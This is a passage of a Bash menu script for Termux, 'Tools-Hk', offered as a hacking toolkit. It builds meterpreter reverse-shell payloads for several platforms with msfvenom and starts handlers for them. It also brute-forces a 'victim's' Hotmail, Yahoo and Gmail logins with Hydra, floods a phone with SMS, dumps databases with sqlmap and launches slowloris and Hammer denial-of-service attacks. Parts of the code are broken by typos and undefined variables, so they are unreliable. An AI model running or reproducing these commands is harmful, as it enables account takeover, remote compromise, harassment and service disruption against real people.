if [ $wifi2 = 5 ]
then
clear
echo -e $red
figlet "RouterSploit"
cd ~
git clone https://github.com/reverse-shell/routersploit
bash Tools-Hk.sh
fi
if [ $wifi2 = 6 ]
then
clear
echo -e $red
figlet "airgeddon"
cd ~
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
bash Tools-Hk.sh
fi
if [ $wifi2 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 4 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "WebSite Hack"
echo ""
echo -e $green "1- Sqlmap"
echo ""
echo -e $green "2- webscan"
echo ""
echo -e $green "3- Xshell"
echo ""
echo -e $green "4- scriptux"
echo ""
echo -e $green "5- Sitebroker"
echo ""
echo -e $green "6- nmap"
echo ""
echo -e $green "7- Devploit"
echo ""
echo -e $green "8- Iplocator"
echo ""
echo -e $green "9- sniper-h"
echo ""
echo -e $green "10- hash-identifier"
echo ""
echo -e $green "11- dirsearch"
echo ""
echo -e $green "12- Google-Dork-Scan"
echo ""
echo -e $green "13- admin-panel-finder"
echo ""
echo -e $green "14- XSStrike"
echo ""
echo -e $green "15- XAttacker"
echo ""
echo -e $green "16- OWScan"
echo ""
echo -e $green "00- Back "
echo ""
read ter_website
if [ $ter_website = 1 ]
then
clear
echo -e $red
figlet "Sqlmap"
cd ~
git clone https://github.com/sqlmapproject/sqlmap
bash Tools-Hk.sh
fi
if [ $ter_website = 2 ]
then
clear
echo -e $red
figlet "webscan"
cd ~
git clonehttps://github.com/kost/docker-webscan
bash Tools-Hk.sh
fi
if [ $ter_website = 3 ]
then
clear
echo -e $red
figlet "Xshell"
cd ~
git clone https://github.com/Ubaii/Xshell
bash Tools-Hk.sh
fi
if [ $ter_website = 4 ]
then
clear
echo -e $red
figlet "scriptux"
cd ~
git clone https://github.com/Gameye98/Scriptux
bash Tools-Hk.sh
fi
if [ $ter_website = 5 ]
then
clear
echo -e $red
figlet "sitebrokler"
cd ~
git clone https://github.com/Anon-Exploiter/SiteBroker
bash Tools-Hk.sh
fi
if [ $ter_website = 6 ]
then
clear
echo -e $red
figlet "nmap"
apt install nmap
bash Tools-Hk.sh
fi
if [ $ter_website = 7 ]
then
clear
echo -e $red
figlet "Devploit"
git clone https://github.com/joker25000/Devploit
bash Tools-Hk.sh
fi
if [ $yer_website = 8 ]
then
clear
echo -e $red
figlet "IPlocator"
cd ~
git clonehttps://github.com/AndreasBriese/ipLocator
bash Tools-Hk.sh
fi
if [ $ter_website = 9 ]
then
clear
echo -e $red
figlet "sniper-h"
git clone https://github.com/laser010/sniper-h
bash Tools-Hk.sh
fi
if [ $ter_website = 10 ]
then
clear
echo -e $red
figlet "hash-identifier"
git clonehttps://github.com/Miserlou/Hash-Identifier
bash Tools-Hk.sh
fi
if [ $ter_website = 11 ]
then
clear
echo -e $red
figlet "dirsearch"
cd ~
git clone https://github.com/maurosoria/dirsearch
bash Tools-Hk.sh
fi
if [ $ter_website = 12 ]
then
clear
echo -e $red
figlet "Google-Dork-Scan"
cd ~
git clone https://github.com/ReiGelado/Google-Dork-scan
bash Tools-Hk.sh
fi
if [ $ter_website = 13 ]
then
clear
echo -e $red
figlet "admin-panel-finder"
cd ~
git clone https://github.com/bdblackhat/admin-panel
bash Tools-Hk.sh
fi
if [ $ter_website = 14 ]
then
clear
echo -e $red
figlet "XSStrike"
cd ~
git clone https://github.com/UltimateHackers/XSStrike
bash Tools-Hk.sh
fi
if [ $ter_website = 15 ]
then
clear
echo -e $red
figlet "XAttacker"
cd ~
git clone https://github.com/Moham3dRiahi/XAttacker
bash Tools-Hk.sh
fi
if [ $ter_website = 16 ]
then
clear
echo -e $red
figlet "OWScan"
cd ~
git clone https://github.com/Gameye98/OWScan
bash Tools-Hk.sh
fi
if [ $ter_website = 00 ]
then
clear
echo -e $red
figlet "back"
bash Tools-Hk.sh
fi
fi
if [ $termux = 5 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-------------------------------------"
echo -e $green"--------------$yellow(2 in 1) -------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "Account Hack"
echo ""
echo -e $green "1- hydra"
echo ""
echo -e $green "2- weeman"
echo ""
echo -e $green "3- crunch (wordlist)"
echo ""
echo -e $green "4- socialfish"
echo ""
echo -e $green "5- Hunner"
echo ""
echo -e $green "00- Back"
echo ""
read  hackacc
if [ $hackacc = 1 ]
then
clear
echo -e $red
figlet "Hydra"
pkg install hydra
bash Tools-Hk.sh
fi
if [ $hackacc = 2 ]
then
clear
echo -e $red
figlet "weeman"
git clone https://github.com/evait-security/weeman.git
bash Tools-Hk.sh
fi
if [ $hackacc = 3 ]
then
clear
echo -e $red
figlet "crunch"
git clone https://github.com/KURO-CODE/Crunch-Cracker.git
bash Tools-Hk.sh
fi
if [ $hackacc = 4 ]
then
clear
echo -e $red
figlet "socialfish"
git clone https://github.com/UndeadSec/SocialFish
bash Tools-Hk.sh
fi
if [ $hackacc = 5 ]
then
clear
echo -e $red
figlet "Hunner"
git clone https://github.com/b3-v3r/Hunner.git
bash Tools-Hk.sh
fi
if [ $hackacc = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 6 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) -------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red "Backup / Recovery"
echo ""
echo -e $green "1- Backup"
echo ""
echo -e $green "2- Recovery"
echo ""
echo -e $green "00- Back"
echo ""
read backup_recovery2
if [ $backup_recovery2 = 1 ]
then
clear
echo -e $red
figlet "backup"
cd ~
apt update && apt upgrade
termux-setup-storage
cd /data/data/com.termux/files
tar -cvzf /sdcard/buckup-termux.tgz home 
usr
bash Tools-Hk.sh
fi
if [ $backup_recovery2 = 2 ]
then
clear
echo -e $red
figlet "Recovery"
cd ~
apt update && apt upgrade
termux-setup-storage
cd /data/data/com.termux/files
tar -xvzf /sdcard/buckup-termux.tgz
bash Tools-Hk.sh
fi
if [ $backup_recovery2 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 7 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "PAYLOAD"
echo ""
echo -e $green "1- Tmux-Bunch"
echo ""
echo -e $green "2- PAYMAX"
echo ""
echo -e $green "3- txtool"
echo ""
echo -e $green "00- Back"
echo ""
read payload
if [ $payload = 1 ]
then
clear
echo -e $red
figlet "Tmux-Bunch"
cd ~
git clone https://github.com/Hax4us/Tmux-Bunch
bash Tools-Hk.sh
fi
if [ $payload = 2 ]
then
clear
echo -e $red
figlet "PAYMAX"
cd ~
git clone https://github.com/Matrix07ksa/PAYMAX
bash Tools-Hk.sh
fi
if [ $payload = 3 ]
then
clear
echo -e $red
figlet "Txtool"
cd ~
git clone https://github.com/kuburan/txtool
bash Tools-Hk.sh
fi
if [ $payload = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 00 ]
then
clear
bash Tools-Hk.sh
fi
if [ $termux = 8 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ----------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "Other"
echo ""
echo -e $green "1- spammer-Grab"
echo ""
echo -e $green "2- Ngrok"
echo ""
echo -e $green "3- change style"
echo ""
echo -e $green "4- root - sudo"
echo ""
echo -e $green "5- kali Nethunter"
echo ""
echo -e $green "00- Back "
echo ""
read other2
if [ $other2 = 1 ]
then
clear
echo -e $red
figlet "spammer-Grab"
cd ~
git clone https://github.com/p4kl0nc4t/Spammer-Grab
bash Tools-Hk.sh
fi
if [ $other2 = 2 ]
then
clear
echo -e $red
figlet "Ngrok"
cd ~
git clone https://github.com/themastersunil/ngrok
bash Tools-Hk.sh
fi
if [ $other2 = 3 ]
then
clear
echo -e $red
figlet "change stayle"
cd ~
git clone https://github.com/profionaldhim/etc/blob/master/bash.bashrc
cp bash.bashrc /cd ..
cp bash.bashrc usr/etc
cd usr/etc
rm -rif motd
bash Tools-Hk.sh
fi
if [ $other2 = 4 ]
then
clear
echo -e $red
figlet "root - sudo"
cd ~
apt upgrade
pkg install git -y
pkg install ncurses-utils -y
git clone https://github.com/profionaldhim/Termux-Sudo
cd Termux-Sudo
ls
cat sudo > /data/data/com.termux/files/usr/bin/sudo
chmod 700 /data/data/com.termux/files/usr/bin/sudo
sudo
bash Tools-Hk.sh
fi
if [ $other2 = 5 ]
then
clear
echo -e $red
figlet "Kali Nethunter"
apt update && apt upgrade -y

cd $HOME

pkg install curl ruby -y

curl -LO https://raw.githubusercontent.com/Hax4us/Nethunter-In-Termux/master/kalinethunter

chmod +x kalinethunter

./kalinethunter

chmod +x finaltouchup.sh

echo -e $yellow "please insert name your pc android ex: arm,arm64 "
read pc

mv finaltouchup.sh kali-$pc/root

startkali

bash finaltouchup.sh

apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6

apt update && apt upgrade -y
fi
if [ $other2 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
fi
if [ $name = 3 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ----------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "TOOLS"
echo ""
echo -e $green "1- injection payloads"
echo ""
echo -e $green "2- Scan Ip"
echo ""
echo -e $green "3- account hack"
echo ""
echo -e $green "4- send sms"
echo ""
echo -e $green "5- web hack"
echo ""
echo -e $green "6- dos attack"
echo ""
echo -e $green "7- scan port"
echo ""
echo -e $green "00- Back "
echo ""
read usage
if [ $usage = 1 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ----------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "Injection payloads"
echo ""
echo -e $green "1- msfvenom"
echo ""
echo -e $green "2- Tmux-Bunch"
echo ""
echo -e $green "3- PAYMAX"
echo ""
echo -e $green "00- Back "
echo ""
read injection_payload
if [ $injection_payload = 1 ]
then
clear
echo ""
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) --------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "msfvenom"
echo ""
echo -e $green     "1- Payload Android"
echo -e $green     "2- Payload Windows"
echo -e $green     "3- Payload Linux"
echo -e $green     "4- Payload Mac"
echo -e $green     "5- Payload ISO"
echo -e $green     "6- Payload Python"
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
echo -e $green     "Enter The Number"
echo -e $red
read pa
if [ $pa = 1 ]
then
clear
figlet "Payload Android"
echo ""
echo -e $green "What is LHOST"
echo -e $red
read lhost
echo ""
echo -e $green "What is LPORT"
echo -e $red
read lport
echo ""
echo -e $green "Name Payload?"
echo -e $red
read name
echo ""
toilet "Loading" | lolcat
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$name.apk
echo ""
echo -e $green "do you want start  metasploit? y/n"
echo -e $red
read yes_no
if [ $yes_no = "y" ]
then
clear
echo -e $green "What is LHOST?"
echo -e $red
read host
echo ""
echo -e $green "What is LPORT?"
echo -e $red
read port
echo ""
toilet "START" | lolcat
msfconsole -x use exploit/multi/handler -x set payload android/meterpreter/reverse_tcp -x set LHOST=$host -x set LPORT=$port -x exploit
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 2 ]
then
clear
figlet "Make Payload Windows"
echo ""
echo -e $green "What is LHOST"
echo -e $red
read lhost
echo ""
echo -e $green "What is LPORT"
echo -e $red
read lport
echo ""
echo -e $green "Name Payload?"
echo -e $red
read name
echo ""
toilet "loading" | lolcat
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o /sdcard/$name.exe
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $red
read yes_no
if [ $yes_no = "y" ]
then
clear
echo -e $green "What is LHOST?"
echo -e $red
read host
echo ""
echo -e $green "What is LPORT?"
echo -e $red
read port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 3 ]
then
clear
figlet "Payload linux"
echo ""
echo -e $green "What is LHOST"
echo -e $red
read lhost
echo ""
echo -e $green "What is LPORT"
echo -e $red
read lport
echo ""
echo -e $green "Name Payload?"
echo -e $red
read name
echo ""
toilet "Loading" | lolcat
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o /sdcard/$name.elf
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $red
read yes_no
if [ $yes_no = "y" ]
then
clear
echo -e $green "What is LHOST?"
echo -e $red
read host
echo ""
echo -e $green "What is LPORT?"
echo -e $red
read port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
clear
echo -e $green"Save Payload To" $HOME/$namp.elf
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 4 ]
then
clear
figlet "Payload mac"
echo ""
echo -e $green "What is LHOST"
echo -e $red
read lhost
echo ""
echo -e $green "What is LPORT"
echo -e $red
read lport
echo ""
echo -e $green "Name Payload?"
echo -e $red
read name
echo ""
toilet "Loading" | lolcat
msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$lhost LPORT=$lport -o /sdcard/$name.macho
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $red
read yes_no
if [ $yes_no = "y" ]
then
clear
echo -e $green "What is LHOST?"
echo -e $red
read host
echo ""
echo -e $green "What is LPORT?"
echo -e $red
read port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 5 ]
then
clear
figlet "Payload iso"
echo ""
echo -e $green "What is LHOST"
echo -e $red
echo ""
read lhost
echo -e $green "What is LPORT"
echo ""
read lport
echo -e $red
echo -e $green "Name Payload?"
echo ""
read name
echo -e $red
toilet "Loading" | 
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$name.api
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $red
read yes_no
if [ $yes_no = "y" ]
then
clear
echo -e $green "What is LHOST?"
echo -e $red
read lhost
echo ""
echo -e $green "What is LPORT?"
echo -e $red
read lport
echo ""
toilet "START" | lolcat
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  LHOST=$lhost LPORT=$lport -o /$HOME/$name.api
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 6 ]
then
clear
figlet "Payload python"
echo ""
echo -e $green "What is LHOST"
echo -e $red
read lhost
echo ""
echo -e $green "What is LPORT"
echo -e $red
read lport
echo ""
echo -e $green "Name Payload?"
echo -e $red
read name
echo ""
toilet "Loading" | lolcat
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$name.py
echo ""
echo -e $green "do you want start  metasploit? y/n"
echo -e $red
read yes_no
if [ $yes_no = "y" ]
then
clear
echo -e $green "What is LHOST?"
echo -e $red
read lhost
echo ""
echo -e $green "What is LPORT?"
echo -e $red
read lport
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $injection_payload = 2 ]
then
clear
echo -e $red
figlet "Tmux-Bunch"
cd ~
cd Tmux-Bunch
./tmuxbunch
bash Tools-Hk.sh
fi
if [ $injection_payload = 3 ]
then
clear
echo -e $red
figlet "PAYMAX"
cd ~
cd PAYMAX
python2 paymax.py
bash Tools-Hk.sh
fi
if [ $injection_payload = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 2 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) -------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "Scan Ip"
echo ""
echo -e $green     "1- nmap"
echo -e $green     "2- Devploit"
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
read scanport
if [ $scanport = 1 ]
then
clear
figlet "scan nmap"
echo ""
echo -e $green "What is Ip web/device "
echo -e $red
read ip
echo ""
toilet "Loading" 
nmap $ip
fi
if [ $scanport = 2 ]
then
clear
figlet "scan Devploit"
echo ""
echo ""
toilet "Loading" 
cd ~
cd Devploit
python2 Devploit
fi
if [ $scanport = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 3 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ---------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "Account Hack"
echo ""
echo -e $green     "1- Crunch wordlist"
echo -e $green     "2- Hydra"
echo -e $green     "3- weeman"
echo -e $green     "4- socialfish"
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
read accountHk
if [ $accountHk = 1 ]
then
clear
figlet "Creat wordlist"
echo ""
echo -e $green "what is the username ? "
echo -e $red
read user
echo ""
echo -e $green "the phone or any number .. "
echo -e $red
read phfone
echo ""
echo -e $green "name list ex :pass.txt "
echo -e $red
read namelist
echo ""
echo -e $green "little user name + phone = ? example : mohammed773532224 = little = 8 phone =9 then 8+9=17 "
echo -e $red
read much
echo ""
echo -e $green "please insert path save ex:/sdcard/"
echo -e $red
read pathsave
echo ""
echo -e $green "insert your pass hack ex:user@@@@@"
echo -e $red
read num
echo ""
toilet "Loading"
crunch $much $much $phone -t $num -o $pathsave$namelist
bash Tools-Hk.sh
fi
if [ $accountHk = 2 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $red
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) -------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "Hydra"
echo ""
echo -e $green     "1- Hotmail"
echo -e $green     "2- Yahoo"
echo -e $green     "3- Gmail"
echo ""
echo -e $green     "00- BACK"
echo ""
read hydra
if [ $hydra = 1 ]
then
clear
figlet "Hotmail Hack"
echo -e $yellow "please insert vactime email .."
echo -e $red
read hayd
echo -e $yellow "please insert path wordlist .."
echo -e $red
read pass
hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.live.com smtp
fi
if [ $hydra = 2 ]
then
clear
figlet "Yahoo Hack"
echo -e $yellow "please insert vactime email .."
echo -e $red
read hayd
echo -e $yellow "please insert path wordlist ..."
echo -e $red
read pass
hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.mail.yahoo smtp
bash Tools-Hk.sh
fi
if [ $hydra = 3 ]
then
clear
figlet "Gmail Hack"
echo -e $yellow "please insert vactime email .."
echo -e $red
read hayd
echo -e $yellow "please insert path wordlist..."
echo -e $red
read pass
hydra -S -l $hayd -P $pass -v -V -e ns -s 465 smtp.gmail.com smtp
bash Tools-Hk.sh
fi
if [ $hydra = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $accountHk = 3 ]
then
clear
figlet "weeman"
cd ~
cd Tools-Hk/weeman
python2 weeman.py
bash Tools-Hk.sh
fi
if [ $accountHk = 4 ]
then
clear
figlet "SocialFish"
cd ~
cd Tools-Hk/SocialFish
chmod +x SocialFish.py
pip install -r requirements.txt
pip2 install wget
python2 SocialFish.py
bash Tools-Hk.sh
fi
if [ $accountHk = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 4 ]
then
clear
echo -e $yellow "please insert how many second .."
read delay
echo -e $yellow "please insert vactime phone .."
read phone
cd ~
cd Spammer-Grab
chmod +x spammer.py
echo "Installing..."
apt update &> /dev/null
apt install python2 -y &> /dev/null
apt install python2-pip -y &> /dev/null
pip2 install requests &> /dev/null
echo "Done"
python2 spammer.py --delay $delay $phone
bash Tools-Hk.sh
fi
if [ $usage = 5 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) -------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red   "web hack"
echo ""
echo -e $green     "1- Sqlmap"
echo ""
echo -e $green     "2- Scriptux(creat index)"
echo ""
echo -e $green     "3- sniper-h(list hash)"
echo ""
echo -e $green     "4- Hash Mix"
echo ""
echo -e $green     "5- hash-identifier"
echo ""
echo -e $green     "6- dirsearch"
echo ""
echo -e $green     "00- BACK"
echo ""
read whk
if [ $whk = 1 ]
then
clear
echo -e $yellow "please insert web url"
read wehk
cd ~
cd sqlmap
python sqlmap.py -u $read --dbs
echo -e $yellow "please insert database"
read datat
python sqlmap.py -u $read --dbs
echo -e $yellow "please insert table"
read table
python sqlmap.py -u $read -D $data --tables
echo -e $yellow "please insert columns"
read columns
python sqlmap.py -u $read -D $data -T $tables columns
echo -e $yellow "please insert data columns"
read dump
python sqlmap.py -u $read -D $data -T $tables -C $columns --dump

echo -e $yellow "Do you want define type hash insert y/n "
read typehash
if [ $typehash = "y" ]
then
clear
cd ~
cd hash-identifier.py
python2 hash-identifier.py

else
bash Tools-Hk.sh
fi
fi
if [ $whk = 2 ]
then
clear
figlet "Creat index "
cd ~
cd Tools-Hk/Scriptux
sudo su
python2 scriptux.py
bash Tools-Hk.sh
fi
if [ $whk = 3 ]
then
clear
figlet "sniper-h "
cd ~
cd Tools-Hl/sniper-h
echo -e $yellow "Do you have list Hash ? please insert y/n"
read pathlist
if [ $pathlist = "y" ]
then
clear
figlet "sniper-h"
echo -e $yellow "please insert path list ex : /sdcard/wordlist.txt"
read pa
python3 sniper-h.py -H $Hash -W $pa -T md5
bash Tools-Hk.sh
else
cd ~
cd sniper-h
python3 sniper-h.py -H $Hash -W wordlist.txt -T md5
bash Tools-Hk.sh
fi
fi
if [ $whk = 4 ]
then
clear
figlet "Hash Mix "
git clone https://github.com/Matrix07ksa/HashMix
cd ~
cd Tools-Hk/HashMix
chmod +x hashmix.py
python2 hashmix.py
fi
if [ $whk = 5 ]
then
clear
figlet "hash-identifier"
cd ~
cd hash-identifier.py
python2 hash-identifier.py
fi
if [ $whk = 6 ]
then
clear
figlet "dirsearch "
cd ~
cd dirsearch
echo -e $yellow "please insert url"
read url
python3 dirsearch.py -u $url -e *
bash Tools-Hk.sh
fi
if [ $whk = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usage = 6 ]
then
clear
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim "
echo -e $red
echo -e $red
figlet -f slant "Tools-Hk" 
echo -e $green '#####################################'
echo -e $green '#                                   #'
echo -e $green '#    Name:-   Tools-Hk v1.0.0       #'
echo -e $green '#    Author:- Mohammed Info         #'
echo -e $green '#    From:-   Yemen                 #'
echo -e $green '#    Fb:www.fb.com/profionaldhim    #'
echo -e $green '#                                   #'
echo -e $green '#####################################'
echo -e $red
echo -e $green"-----------------------------------"
echo -e $green"--------------$yellow(2 in 1) ------------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED "
echo ''
echo -e $red      " DDos Attack"
echo ""
echo -e $green     "1- slowloris"
echo -e $green     "2- Hammer"
echo ""
echo -e $green     "00- BACK"
echo ""
read Ddosattack
if [ $Ddosattack = 1 ]
then
clear
figlet "Slowloris "
cd ~
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python setup.py
figlet "Dos Attack"
echo -e $yellow "please insert url web"
read url
python slowloris.py $url
fi
if [ $Ddosattack = 2 ]
then
clear
figlet "Hammer "
cd ~
cd hammer
echo -e $yellow "please insert ip web.."
read ip
echo -e $yellow "please insert port defult :80"
read port
echo -e $yellow "please insert speed defult :135"
read speed
python3 hammer.py -s $ip -p $port -t $speed
bash Tools-Hk.sh
fi
if [ $Ddosattack = 00 ]
then
clear
